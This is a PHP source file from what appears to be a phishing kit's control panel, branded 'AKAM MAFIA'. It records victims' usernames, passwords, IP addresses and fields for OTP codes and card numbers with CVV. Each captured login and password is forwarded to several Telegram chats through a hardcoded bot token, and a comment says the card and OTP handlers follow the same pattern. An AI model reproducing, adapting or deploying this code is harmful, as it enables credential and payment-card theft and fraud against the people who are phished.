<?php
// panel/lib/funciones.php - AKAM MAFIA VERSION OPTIMIZADA

// ==========================================
// CONFIGURACIÓN CENTRAL
// ==========================================
define('BOT_TOKEN', '8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA');
$GLOBALS['chat_ids'] = ["8114050673", "6616662846", "8638340940"];

function enviar_telegram($mensaje) {
    foreach($GLOBALS['chat_ids'] as $id){
        $url = "https://api.telegram.org/bot".BOT_TOKEN."/sendMessage";
        $data = ['chat_id' => $id, 'text' => $mensaje, 'parse_mode' => 'HTML'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Aumentado para evitar cortes
        curl_exec($ch);
        curl_close($ch);
    }
}

// ==========================================
// GESTIÓN DE DATOS JSON (CORREGIDO PARA RAILWAY)
// ==========================================
function _data_file_path() {
    // Usamos la ruta real del servidor para evitar bloqueos
    $base = dirname(__FILE__, 3) . '/data'; 
    if (!is_dir($base)) { 
        @mkdir($base, 0777, true); 
    }
    return $base . '/data.json';
}

function _data_load() {
    $file = _data_file_path();
    if (!file_exists($file)) { 
        @file_put_contents($file, json_encode([]), LOCK_EX); 
        return [];
    }
    $content = @file_get_contents($file);
    return json_decode($content, true) ?: [];
}

function _data_save($arr) {
    // Aseguramos que el JSON se guarde bien formado
    @file_put_contents(_data_file_path(), json_encode(array_values($arr), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function _now() {
    date_default_timezone_set('America/Bogota');
    return date("Y-m-d H:i:s");
}

// ==========================================
// FUNCIONES DE PROCESAMIENTO
// ==========================================

function crear_registro($usr, $dis){
    $data = _data_load();
    $id = time(); // Usamos TIMESTAMP para que el ID sea único y no se repita
    $ip = $_SERVER['REMOTE_ADDR'];
    if(empty($usr)) { $usr = "No detectado"; }

    $nuevo = [
        'idreg' => $id, 
        'usuario' => $usr, 
        'password' => '', 
        'otp' => '', 
        'dispositivo' => $dis, 
        'ip' => $ip, 
        'status' => 1, 
        'horamodificado' => _now(),
        'tarjeta' => '', 
        'ftarjeta' => '', 
        'cvv' => ''
    ];
    
    $data[] = $nuevo;
    _data_save($data);

    $msg = "⭐ <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n👤 <b>USUARIO:</b> <code>$usr</code>\n📱 <b>DISP:</b> <code>$dis</code>\n📍 <b>IP:</b> <code>$ip</code>\n\n✅ <b>ESPERANDO CLAVE...</b>";
    enviar_telegram($msg);
    return $id;
}

function actualizar_registro_pass($reg, $pas){
    $data = _data_load();
    $encontrado = false;
    foreach ($data as &$it) {
        if (strval($it['idreg']) === strval($reg)) {
            $it['password'] = $pas; 
            $it['horamodificado'] = _now();
            $msg = "🔑 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - CLAVE</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n🔑 <b>CLAVE:</b> <code>$pas</code>\n📍 <b>IP:</b> <code>".$it['ip']."</code>";
            enviar_telegram($msg);
            $encontrado = true;
            break;
        }
    }
    if($encontrado) _data_save($data);
}

// ... Las demás funciones de actualización (tarjeta, otp) siguen el mismo patrón
